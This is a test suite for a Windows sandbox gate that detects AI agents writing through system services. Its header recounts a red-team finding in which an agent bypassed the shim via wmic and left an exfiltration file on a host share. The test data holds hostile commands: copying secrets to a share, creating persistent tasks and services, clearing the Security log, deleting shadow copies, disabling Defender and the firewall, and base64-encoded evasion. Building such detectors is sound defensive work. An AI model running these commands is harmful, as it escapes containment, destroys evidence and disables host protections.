#!/usr/bin/env node
/**
 * 服务侧写入闸门（SERVICE_SIDE_ESCAPE_BLOCKED）—— 纯离线判定面。
 *
 * 背景：2026-11-23 AI 红队在真实 guest 上用 `wmic process call create` 绕过 TS 垫片，
 * 在真实盘写入并在宿主共享目录留下外传文件；`schtasks /create`、`sc create` 同样落到
 * 真实服务/任务。见 docs/AI红队渗透实测-2026-11-23.md。
 *
 * 本套件只钉**判定文本**（不 spawn、不碰系统状态）：
 *   1. 已知服务侧构造必须命中，且通道正确；
 *   2. 只读查询（sc query / schtasks /query / wevtutil qe / bcdedit /enum / netsh show）
 *      不得误伤；
 *   3. 脚本文件内容与 `-EncodedCommand` 载荷必须进入扫描面（agent 的常见绕过形态）；
 *   4. 显式 allow 逃生口生效。
 */
import { classifyServiceSideWrite, matchServiceSideText, decodePowerShellEncodedCommand, serviceSideRedirectFor, SERVICE_SIDE_CHANNELS } from '../src/service-side.ts'
import { WindowsStageExecutor } from '../src/executor.ts'
import { mkdtempSync, readFileSync, existsSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

let checks = 0
let failures = 0
function ok(condition: boolean, label: string, detail?: unknown): void {
  checks += 1
  if (condition) process.stdout.write(`  ✓ ${label}\n`)
  else {
    failures += 1
    process.stdout.write(`  ✗ ${label}${detail === undefined ? '' : ` — ${String(detail)}`}\n`)
  }
}

const positives: Array<[string, string, string]> = [
  ['wmic', 'process call create "cmd.exe /c echo hi > C:\\Windows\\System32\\x.txt"', SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE],
  ['wmic', 'process call create "cmd.exe /c copy C:\\secret.txt \\\\host.lan\\Data\\x"', SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE],
  ['powershell', '-NoProfile -Command "(Get-CimInstance Win32_Process).Create(\'cmd.exe /c calc\')"', SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE],
  ['powershell', '-NoProfile -Command "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=\'cmd.exe\'}"', SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE],
  ['sc', 'create RTTestSvc binPath= "C:\\Windows\\System32\\calc.exe" start= auto', SERVICE_SIDE_CHANNELS.SCM_SERVICE],
  ['sc.exe', 'config RTTestSvc start= disabled', SERVICE_SIDE_CHANNELS.SCM_SERVICE],
  ['powershell', '-Command "New-Service -Name x -BinaryPathName C:\\x.exe"', SERVICE_SIDE_CHANNELS.SCM_SERVICE],
  ['schtasks', '/create /tn RTTestTask /tr "C:\\Windows\\System32\\calc.exe" /sc onlogon /f', SERVICE_SIDE_CHANNELS.TASK_SCHEDULER],
  ['powershell', '-Command "Register-ScheduledTask -TaskName x -Action $a"', SERVICE_SIDE_CHANNELS.TASK_SCHEDULER],
  ['wevtutil', 'cl Security', SERVICE_SIDE_CHANNELS.EVENT_LOG],
  ['powershell', '-Command "Clear-EventLog -LogName Security"', SERVICE_SIDE_CHANNELS.EVENT_LOG],
  ['vssadmin', 'delete shadows /all /quiet', SERVICE_SIDE_CHANNELS.VOLUME_SHADOW],
  ['powershell', '-Command "Set-MpPreference -DisableRealtimeMonitoring $true"', SERVICE_SIDE_CHANNELS.DEFENDER_POLICY],
  ['netsh', 'advfirewall set allprofiles state off', SERVICE_SIDE_CHANNELS.FIREWALL],
  ['bcdedit', '/set {default} safeboot minimal', SERVICE_SIDE_CHANNELS.BOOT_CONFIG],
]
process.stdout.write('=== 1. 已知服务侧构造必须命中 ===\n')
for (const [command, argText, channel] of positives) {
  const args = argText.match(/"([^"]*)"|(\S+)/g)?.map((t) => t.replace(/^"|"$/g, '')) ?? []
  const result = classifyServiceSideWrite(command, args)
  ok(result.hit && result.channel === channel, `${command} ${argText.slice(0, 56)}`, JSON.stringify(result))
}

process.stdout.write('\n=== 2. 只读查询不得误伤 ===\n')
const negatives = [
  ['wmic', 'process get ProcessId,Name'],
  ['wmic', 'os get Caption'],
  ['sc', 'query RTTestSvc'],
  ['schtasks', '/query /tn RTTestTask'],
  ['wevtutil', 'qe Security /c:5'],
  ['netsh', 'advfirewall show allprofiles'],
  ['bcdedit', '/enum'],
  ['cmd.exe', '/c dir C:\\'],
  ['powershell', '-Command "Get-Process | Select-Object -First 3"'],
]
for (const [command, argText] of negatives) {
  const args = argText.split(/\s+/)
  const result = classifyServiceSideWrite(command, args)
  ok(!result.hit, `${command} ${argText}`, JSON.stringify(result))
}

process.stdout.write('\n=== 3. 脚本内容与 EncodedCommand 进入扫描面 ===\n')
const scriptText = 'wmic process call create "cmd.exe /c whoami > C:\\x.txt"'
const viaScript = classifyServiceSideWrite('cmd.exe', ['/d', '/c', 'C:\\rt\\run.cmd'], {
  readFile: (path: string) => (path.toLowerCase() === 'c:\\rt\\run.cmd' ? scriptText : null),
})
ok(viaScript.hit && viaScript.channel === SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE, 'cmd /c run.cmd 的内容被扫描', JSON.stringify(viaScript))

const encoded = Buffer.from('schtasks /create /tn x /tr calc.exe /sc onlogon /f', 'utf16le').toString('base64')
const viaEncoded = classifyServiceSideWrite('powershell.exe', ['-NoProfile', '-EncodedCommand', encoded])
ok(viaEncoded.hit && viaEncoded.channel === SERVICE_SIDE_CHANNELS.TASK_SCHEDULER, 'EncodedCommand 解码后命中', JSON.stringify(viaEncoded))
ok(decodePowerShellEncodedCommand(`-enc ${encoded}`).includes('schtasks'), 'EncodedCommand 解码内容正确')

process.stdout.write('\n=== 4. 显式逃生口 ===\n')
const escaped = classifyServiceSideWrite('schtasks', ['/create', '/tn', 'x'], { allow: true })
ok(!escaped.hit, 'allow:true 时不拦', JSON.stringify(escaped))

process.stdout.write('\n=== 5. 纯函数边界 ===\n')
ok(matchServiceSideText('') === null, '空文本不命中')
ok(matchServiceSideText('echo win32_process') === null, '只出现类名不命中（没有 .Create）')

process.stdout.write('\n=== 6. 重定向判定 + wmic 改写 ===\n')
ok(serviceSideRedirectFor(SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE, 'shim') === 'injector-rewrite', 'shim 档 WMI 可重定向')
ok(serviceSideRedirectFor(SERVICE_SIDE_CHANNELS.WMI_PROCESS_CREATE, 't1') === null, '非 shim 档不声明重定向')
ok(serviceSideRedirectFor(SERVICE_SIDE_CHANNELS.TASK_SCHEDULER, 'shim') === null, '计划任务尚未实现重定向')

const tmp = mkdtempSync(join(tmpdir(), 'winstage-wmi-'))
try {
  const executor: any = new WindowsStageExecutor({
    stagingRoot: 'C:\\stage\\staged',
    registryStageDir: tmp,
    mode: 'workspace-write',
    tier: 'TS',
  })
  executor.launchMode = 'shim'
  executor.transparent = { artifacts: { injectorPath: 'C:\\plugin\\winstage-inject.exe', dllPath: 'C:\\plugin\\winstage-shim.dll' } }
  executor.initReport = { shimConfigPath: 'C:\\stage\\staged\\winstage-shim.config.json' }
  const rewritten = executor.rewriteWmicProcessCreate('wmic', [
    'process',
    'call',
    'create',
    'cmd.exe /d /c "echo x > C:\\Windows\\System32\\x.txt"',
  ])
  ok(rewritten && rewritten.command === 'wmic', '保留 wmic 调用（输出形态不变）', JSON.stringify(rewritten?.command))
  ok(Array.isArray(rewritten?.args) && rewritten.args[3].includes('winstage-inject.exe'), '内层命令改为注入器', rewritten?.args?.[3]?.slice(0, 90))
  ok(typeof rewritten?.scriptPath === 'string' && existsSync(rewritten.scriptPath), '内层命令写入会话目录脚本')
  ok(/echo x > C:\\Windows/.test(readFileSync(rewritten.scriptPath, 'utf8')), '脚本内容保真')
  ok(executor.rewriteWmicProcessCreate('wmic', ['os', 'get', 'caption']) === null, '非 process create 不改写')
  ok(executor.rewriteWmicProcessCreate('cmd.exe', ['/c', 'dir']) === null, '非 wmic 不改写')
  ok(executor.rewriteWmicProcessCreate('wmic', ['/node:remote', 'process', 'call', 'create', 'x']) === null, '远端目标不改写')
  executor.launchMode = 't1'
  ok(executor.rewriteWmicProcessCreate('wmic', ['process', 'call', 'create', 'x']) === null, '非 shim 档不改写')
} finally {
  rmSync(tmp, { recursive: true, force: true })
}

process.stdout.write(`\nRESULT: ${failures === 0 ? 'PASS' : 'FAIL'} checks=${checks} failures=${failures}\n`)
process.exit(failures === 0 ? 0 : 1)
